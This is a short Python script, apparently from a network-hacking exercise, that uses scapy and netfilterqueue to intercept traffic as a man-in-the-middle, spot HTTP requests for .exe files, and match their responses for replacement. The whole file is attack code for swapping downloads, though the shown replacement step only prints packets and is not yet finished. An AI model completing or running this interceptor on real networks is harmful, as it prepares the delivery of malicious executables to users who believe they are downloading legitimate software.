#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue

ack_list = []

def process_packet(packet):
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.Raw):                # check if an http layer exists
				if scapy_packet[scapy.TCP].dport == 80:
						print("HTTP Request")
						if ".exe" in scapy_packet[scapy.Raw].load:
							print("[+] exe Request")
							ack_list.append(scapy_packet[scapy.TCP].ack)
							print(scapy_packet.show())
				elif scapy_packet[scapy.TCP].sport == 80:
						print("HTTP Response")
						if scapy_packet[scapy.TCP].seq in ack_list:
								print("[+] Replacing file")
								print(scapy_packet.show())
				
		packet.accept()
		
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()